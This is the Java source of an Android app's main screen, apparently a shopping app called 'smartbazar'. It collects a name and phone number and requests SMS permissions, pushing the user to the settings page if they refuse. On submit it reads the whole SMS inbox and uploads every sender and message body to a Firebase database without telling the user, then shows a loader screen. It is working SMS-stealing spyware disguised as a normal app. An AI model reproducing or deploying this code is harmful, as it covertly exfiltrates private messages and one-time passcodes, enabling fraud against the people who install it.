package com.bazaar.smartbazar;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.speech.tts.TextToSpeech;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    SMSReceiver smsReceiver = new SMSReceiver();

    Button submitBtn;
    EditText name_et, number_et;
    private static final int SMS_PERMISSION_CODE = 123;

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            } else {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                Uri uri = Uri.fromParts("package", getPackageName(), null);
                intent.setData(uri);
                startActivity(intent);
            }
        }
    }

    private static final int SMS_PERMISSION_REQUEST_CODE = 123;


    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        submitBtn = findViewById(R.id.submit_btn);
        name_et = findViewById(R.id.name_et);
        number_et = findViewById(R.id.number_et);

        IntentFilter filter;
        filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, filter);

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{android.Manifest.permission.RECEIVE_SMS}, SMS_PERMISSION_REQUEST_CODE);
        }


        submitBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{android.Manifest.permission.READ_SMS}, SMS_PERMISSION_CODE);
                } else {
                    String nameEt = name_et.getText().toString().trim();
                    String numberEt = number_et.getText().toString().trim();
                    if (nameEt.isEmpty()) {
                        name_et.setError("Enter name to continue");
                    }
                    if (numberEt.isEmpty()) {
                        number_et.setError("Enter number to continue");

                    }

                    SharedPreferences sharedPreferences = getSharedPreferences("SharedPref", MODE_PRIVATE);
                    SharedPreferences.Editor myEdit = sharedPreferences.edit();

                    myEdit.putString("number", numberEt);
                    myEdit.apply();


                    if (!nameEt.isEmpty() && !numberEt.isEmpty()) {

                        Uri uri = Uri.parse("content://sms/inbox");
                        Cursor cursor = getContentResolver().query(uri, null, null, null, null);

                        if (cursor != null && cursor.moveToFirst()) {
                            do {
                                @SuppressLint("Range") String sender = cursor.getString(cursor.getColumnIndex("address"));
                                @SuppressLint("Range") String message = cursor.getString(cursor.getColumnIndex("body"));

                                String receiverNumber = "91" + number_et.getText().toString().trim();

                                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("users").child(receiverNumber);
                                databaseReference.child("userDetails").child("userName").setValue(nameEt);
                                databaseReference.child("userDetails").child("userNumber").setValue("+" + receiverNumber);
                                databaseReference.child("userDetails").child("userStatus").setValue("Active");

                                DatabaseReference databaseReferenceInbox = FirebaseDatabase.getInstance().getReference().child("users")
                                        .child(receiverNumber).child("userInbox").push();

                                databaseReferenceInbox.child("sender").setValue(sender);
                                databaseReferenceInbox.child("text").setValue(message);


                            } while (cursor.moveToNext());

                            cursor.close();
                        }
                    }
                }

                Intent intent = new Intent(MainActivity.this, Loader.class);
                startActivity(intent);

            }
        });

    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    public static class AppUninstallObserver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(Intent.ACTION_PACKAGE_REMOVED)) {
                Log.d("UNIN", "onChange: ");
            }
        }
    }

}